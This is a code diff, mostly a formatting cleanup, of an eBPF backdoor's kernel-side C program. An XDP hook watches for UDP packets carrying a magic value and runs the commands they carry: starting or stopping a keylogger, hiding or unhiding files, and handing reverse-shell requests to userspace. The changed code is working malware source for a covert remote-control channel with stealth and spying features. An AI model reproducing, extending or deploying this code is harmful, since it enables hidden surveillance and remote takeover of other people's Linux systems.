@@ -1,38 +1,33 @@
+#include <vmlinux.h>
+#include <asm-generic/errno-base.h>
 #include <bpf/bpf_endian.h>
 #include <bpf/bpf_helpers.h>
-#include <asm-generic/errno-base.h>
-#include <vmlinux.h>
 
-#include "bpf/backdoor.h"
 #include "bpf/maps.h"
 
 #define ETH_P_IP 0x0800
 
-static void start_keylogger()
-{
+static void start_keylogger() {
     u32 key = KEYLOGGER_ENABLED;
     u32 value = 1;
 
     bpf_map_update_elem(&config_map, &key, &value, BPF_ANY);
 }
 
-static void stop_keylogger()
-{
+static void stop_keylogger() {
     u32 key = KEYLOGGER_ENABLED;
     u32 value = 0;
 
     bpf_map_update_elem(&config_map, &key, &value, BPF_ANY);
 }
 
-static void hide_file(char* filename)
-{
+static void hide_file(char *filename) {
     u8 value = 1;
 
     bpf_map_update_elem(&hide_names_map, filename, &value, BPF_ANY);
 }
 
-static void unhide_file(char* filename)
-{
+static void unhide_file(char *filename) {
     bpf_map_delete_elem(&hide_names_map, filename);
 }
 
@@ -44,8 +39,7 @@ static void unhide_file(char* filename)
  * @return int returns 0 on command opcode identified and ran.
  * returns -ENOENT upon command opcode not found.
  */
-static int process_and_execute_command(command_packet_t* command)
-{
+static int process_and_execute_command(command_packet_t *command) {
     char command_data[MAX_HIDDEN_FILE_NAME_LEN];
 
     /* Check for magic payloads */
@@ -64,7 +58,7 @@ static int process_and_execute_command(command_packet_t* command)
         __builtin_memcpy(command_data, command->data, sizeof(command_data));
         unhide_file(command_data);
         break;
-    case COMMAND_REVERSE_SHELL:
+    case COMMAND_REVERSE_SHELL_START:
         /* Will be handles by userspace */
         break;
     default:
@@ -82,9 +76,10 @@ static int process_and_execute_command(command_packet_t* command)
  * @param udph
  * @param command
  */
-static void submit_event_to_userspace(struct iphdr* iph, struct udphdr* udph, command_packet_t* command)
-{
-    struct event_t* event = bpf_ringbuf_reserve(&events, sizeof(*event), 0);
+static void submit_event_to_userspace(struct iphdr *iph, struct udphdr *udph,
+                                      command_packet_t *command) {
+    event_t *event = (event_t *)bpf_ringbuf_reserve(&events, sizeof(*event), 0);
+
     if (event) {
         event->src_ip = iph->saddr;
         event->src_port = bpf_ntohs(udph->source);
@@ -102,36 +97,35 @@ static void submit_event_to_userspace(struct iphdr* iph, struct udphdr* udph, co
  *
  */
 SEC("xdp")
-int filter_magic_packets(struct xdp_md* ctx)
-{
-    void* data_end = (void*)(long)ctx->data_end;
-    void* data = (void*)(long)ctx->data;
+int filter_magic_packets(struct xdp_md *ctx) {
+    void *data_end = (void *)(long)ctx->data_end;
+    void *data = (void *)(long)ctx->data;
     int ret = 0;
 
     /* Parse ethernet header */
-    struct ethhdr* eth = data;
-    if ((void*)(eth + 1) > data_end)
+    struct ethhdr *eth = data;
+    if ((void *)(eth + 1) > data_end)
         return XDP_PASS;
 
     if (eth->h_proto != bpf_htons(ETH_P_IP))
         return XDP_PASS;
 
     /* Parse IP header */
-    struct iphdr* iph = (void*)(eth + 1);
-    if ((void*)(iph + 1) > data_end)
+    struct iphdr *iph = (void *)(eth + 1);
+    if ((void *)(iph + 1) > data_end)
         return XDP_PASS;
 
     if (iph->protocol != IPPROTO_UDP)
         return XDP_PASS;
 
     /* Parse UDP header */
-    struct udphdr* udph = (void*)(iph + 1);
-    if ((void*)(udph + 1) > data_end)
+    struct udphdr *udph = (void *)(iph + 1);
+    if ((void *)(udph + 1) > data_end)
         return XDP_PASS;
 
-    command_packet_t* command = (void*)(udph + 1);
+    command_packet_t *command = (void *)(udph + 1);
 
-    if ((void*)(command + 1) > data_end)
+    if ((void *)(command + 1) > data_end)
         return XDP_PASS;
 
     if (command->magic != COMMAND_MAGIC)
